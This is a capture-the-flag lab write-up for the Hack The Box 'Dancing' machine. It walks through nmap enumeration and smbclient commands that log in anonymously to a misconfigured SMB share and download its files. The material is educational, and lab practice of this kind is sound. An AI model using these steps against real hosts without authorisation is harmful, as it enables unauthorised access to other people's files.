# HTB Starting Point — Dancing

**Difficulty:** Very Easy
**Category:** SMB

## Overview

Dancing is an introduction to SMB enumeration. A Windows host exposes an SMB
share that was configured to allow unauthenticated (anonymous) access,
letting anyone browse and download its contents.

## 1. Enumeration

```bash
sudo nmap -sV <target_IP>
```

Results:

| Port | Service |
|------|---------|
| 135/tcp | Microsoft Windows RPC |
| 445/tcp | microsoft-ds (SMB) |

`Service Info` confirms the target OS is Windows.

## 2. Installing the Client

```bash
sudo apt-get install smbclient
```

## 3. Listing Available Shares

```bash
smbclient -L <target_IP>
```

Leaving the password prompt blank (anonymous login) returns four shares:

| Share | Type | Notes |
|-------|------|-------|
| ADMIN$ | Disk | Default administrative share |
| C$ | Disk | Default share for the C:\ volume |
| IPC$ | IPC | Inter-process communication, not browsable |
| WorkShares | Disk | Custom share |

## 4. Testing Each Share

```bash
smbclient \\\\<target_IP>\\ADMIN$
smbclient \\\\<target_IP>\\C$
```

Both return `NT_STATUS_ACCESS_DENIED` — expected, since the default
administrative shares require valid credentials.

```bash
smbclient \\\\<target_IP>\\WorkShares
```

This one connects successfully with a blank password, dropping into an
interactive `smb: \>` shell — the custom share was left open.

## 5. Browsing the Share

```
smb: \> ls
```

Two folders are present: `Amy.J` and `James.P`.

```
smb: \> cd Amy.J
smb: \Amy.J\> ls
smb: \Amy.J\> get worknotes.txt
```

`worknotes.txt` turns out to be internal notes, not the flag.

```
smb: \Amy.J\> cd ..
smb: \> cd James.P
smb: \James.P\> ls
smb: \James.P\> get flag.txt
```

## 6. Reading the Flag

```bash
cat flag.txt
```

## Takeaways

- Always enumerate SMB shares with a blank/anonymous login before assuming
  credentials are required — misconfigured custom shares are common.
- The default `ADMIN$`, `C$`, and `IPC$` shares being locked down doesn't
  mean every share on the host is — check each one individually.
- `smbclient -L` for discovery, then `smbclient //<ip>/<share>` plus
  `ls` / `cd` / `get` to navigate, covers most of what's needed for basic SMB
  enumeration.
